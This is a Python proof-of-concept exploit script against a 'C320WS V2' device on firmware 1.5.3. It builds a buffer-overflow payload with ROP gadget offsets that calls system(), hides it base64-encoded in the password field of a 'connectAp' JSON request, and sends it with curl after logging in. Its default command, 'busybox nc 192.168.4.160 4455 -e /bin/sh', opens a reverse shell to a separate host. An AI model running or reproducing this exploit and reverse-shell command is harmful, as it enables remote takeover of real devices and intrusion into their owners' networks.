import base64,json,struct,subprocess,sys,time,api
# C320WS V2 fw 1.5.3 offsets (blind attempt)
T={"saved":0x424,"pop":0x00020004,"pivot":0x000E1080,"system":0x0001B468}
def payload(cmd):
    cmd_b=cmd.encode()+b'\0'
    first=T["saved"]+4; command_at=first+10*4
    buf=bytearray(b'A'*(command_at+len(cmd_b)))
    buf[T["saved"]:T["saved"]+4]=struct.pack('<I',T["pop"])
    chain=[T["system"]]+[0x41414141]*8+[T["pivot"]]
    for i,w in enumerate(chain): buf[first+i*4:first+i*4+4]=struct.pack('<I',w)
    buf[command_at:command_at+len(cmd_b)]=cmd_b
    return base64.b64encode(buf).decode(), len(buf)
def send(host,path,body):
    r=subprocess.run(["curl","-sk","-m","10","-H","Content-Type: application/json","-H","User-Agent","-X","POST","-d",json.dumps(body),f"https://{host}{path}"],capture_output=True,text=True)
    return r.stdout
if __name__=="__main__":
    host=sys.argv[1]; cmd=sys.argv[2] if len(sys.argv)>2 else "busybox nc 192.168.4.160 4455 -e /bin/sh"
    api.HOST=host; s=api.login(); print("stok ok")
    b64,n=payload(cmd); print("payload",n,"decoded bytes; cmd:",cmd)
    body={"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"poc","bssid":"00:11:22:33:44:55","auth":1,"encryption":3,"password":b64,"pwd_encrypted":True,"unique_key":"A"*16}}}}
    t=time.time()
    try:
        out=send(host,f"/stok={s['stok']}/ds",body)
        print(f"resp {len(out)}B in {time.time()-t:.1f}s:",out[:200])
    except Exception as e: print("conn dropped",e)
